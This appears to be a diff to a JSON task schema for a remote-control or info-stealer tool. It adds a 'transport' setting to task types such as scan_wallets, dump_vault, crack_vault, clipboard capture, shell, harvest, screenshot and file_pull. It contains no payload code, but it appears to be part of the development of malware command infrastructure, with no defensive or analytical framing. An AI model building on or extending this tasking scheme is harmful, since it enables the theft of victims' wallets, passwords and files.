@@ -2,6 +2,7 @@
   "$id": "spc:tasks:v1",
   "types": {
     "scan_wallets": {
+      "transport": "http",
       "params": {
         "type": "object",
         "additionalProperties": false,
@@ -62,6 +63,7 @@
       }
     },
     "dump_vault": {
+      "transport": "http",
       "params": {
         "type": "object",
         "additionalProperties": false,
@@ -115,6 +117,7 @@
       }
     },
     "crack_vault": {
+      "transport": "http",
       "params": {
         "type": "object",
         "additionalProperties": false,
@@ -174,6 +177,7 @@
       }
     },
     "clip_start": {
+      "transport": "frame",
       "params": {
         "type": "object",
         "additionalProperties": false,
@@ -204,6 +208,7 @@
       }
     },
     "clip_stop": {
+      "transport": "frame",
       "params": {
         "type": "object",
         "additionalProperties": false
@@ -213,6 +218,7 @@
       }
     },
     "shell": {
+      "transport": "http",
       "params": {
         "type": "object",
         "required": [
@@ -244,6 +250,7 @@
       }
     },
     "harvest": {
+      "transport": "frame",
       "params": {
         "type": "object",
         "additionalProperties": false
@@ -253,6 +260,7 @@
       }
     },
     "screenshot": {
+      "transport": "frame",
       "params": {
         "type": "object",
         "additionalProperties": false
@@ -262,6 +270,7 @@
       }
     },
     "file_pull": {
+      "transport": "frame",
       "params": {
         "type": "object",
         "required": [
@@ -285,6 +294,7 @@
       }
     },
     "cancel": {
+      "transport": "frame",
       "params": {
         "type": "object",
         "required": [
@@ -302,6 +312,7 @@
       }
     },
     "agent": {
+      "transport": "http",
       "params": {
         "type": "object",
         "required": [
